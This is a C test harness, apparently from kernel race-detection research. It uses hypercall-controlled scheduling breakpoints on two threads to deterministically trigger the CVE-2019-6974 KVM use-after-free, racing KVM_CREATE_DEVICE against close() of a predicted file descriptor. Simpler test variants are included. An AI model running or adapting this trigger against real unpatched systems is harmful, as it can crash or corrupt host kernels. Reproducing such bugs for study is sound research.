#define _GNU_SOURCE

#include <err.h>
#include <fcntl.h>
#include <linux/kvm.h>
#include <pthread.h>
#include <sched.h>
#include <stdio.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <unistd.h>

// TODO:

int predicted_fd = -1;
int vm;

#include "hypercall.h"

#define gettid() syscall(SYS_gettid)

static void set_affinity(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(gettid(), sizeof(set), &set))
        perror("sched_setaffinity");
}

struct schedpoint {
    unsigned long long addr;
    int order;
};

static void install_schedpoint(struct schedpoint *sched, int size)
{
    printf("hihi %d\n", size);
    for (int i = 0; i < size; i++) {
        hypercall(HCALL_INSTALL_BP, sched[i].addr, sched[i].order, 0);
    }
    unsigned long ret;
#define EAGAIN 11
    int cnt = 10;
    do {
        ret = hypercall(HCALL_ACTIVATE_BP, 0, 0, 0);
        usleep(5 * 1000);
    } while (ret == -EAGAIN && --cnt);
}

static void clear_schedpoint(void)
{
    hypercall(HCALL_DEACTIVATE_BP, 0, 0, 0);
    hypercall(HCALL_CLEAR_BP, 0, 0, 0);
}

static void *th1(void *dummy)
{
    set_affinity(1);
    struct schedpoint sched[] = {
#ifdef CVE20196974
#include "schedpoint/cve-2019-6974-1.h"
#endif
#ifdef CVE20196974_MINIMAL
#include "schedpoint/cve-2019-6974-minimal-1.h"
#endif
#ifdef SIMPLE_TEST
#include "schedpoint/simple-1.h"
#endif
#ifdef BYPASS_TEST
#include "schedpoint/bypass-1.h"
#endif
    };
    install_schedpoint(sched, sizeof(sched) / sizeof(sched[0]));
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    struct kvm_create_device cd = {.type = KVM_DEV_TYPE_VFIO,
                                   .fd = -1, // outparm
                                   .flags = 0};
    ioctl(vm, KVM_CREATE_DEVICE, &cd);
#endif
#if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
#define SYS_qcshed_simple_write 509
    syscall(SYS_qcshed_simple_write);
#endif
    clear_schedpoint();
    return NULL;
}

static void *th2(void *dummy)
{
    set_affinity(2);
    struct schedpoint sched[] = {
#ifdef CVE20196974
#include "schedpoint/cve-2019-6974-2.h"
#endif
#ifdef CVE20196974_MINIMAL
#include "schedpoint/cve-2019-6974-minimal-2.h"
#endif
#ifdef SIMPLE_TEST
#include "schedpoint/simple-2.h"
#endif
#ifdef BYPASS_TEST
#include "schedpoint/bypass-2.h"
#endif
    };

    install_schedpoint(sched, sizeof(sched) / sizeof(sched[0]));
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    close(predicted_fd);
#endif
#if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
#define SYS_qcshed_simple_read 510
    syscall(SYS_qcshed_simple_read);
#endif
    clear_schedpoint();
    return NULL;
}

static void init()
{
#if defined(CVE20196974) || defined(CVE20196974_MINIMAL)
    predicted_fd = -1;
    int kvm = open("/dev/kvm", O_RDWR);
    if (kvm == -1)
        perror("open");
    vm = ioctl(kvm, KVM_CREATE_VM, 0);
    if (vm == -1)
        perror("KVM_CREATE_VM");
    predicted_fd = dup(0);
    close(predicted_fd);
#endif
}

int main(void)
{
    pthread_t pth1, pth2;
    int nr_bps = -1;

    set_affinity(0);
#ifdef CVE20196974
    nr_bps = 22;
#endif
#ifdef CVE20196974_MINIMAL
    nr_bps = 2;
#endif
#if defined(SIMPLE_TEST) || defined(BYPASS_TEST)
    nr_bps = 20;
#endif
    hypercall(HCALL_RESET, 0, 0, 0);
    hypercall(HCALL_PREPARE_BP, nr_bps, 2, 0);
    hypercall(HCALL_ENABLE_KSSB, 0, 0, 0);

    init();

    pthread_create(&pth1, NULL, th1, NULL);
    pthread_create(&pth2, NULL, th2, NULL);
    pthread_join(pth1, NULL);
    pthread_join(pth2, NULL);

    hypercall(HCALL_DISABLE_KSSB, 0, 0, 0);
}
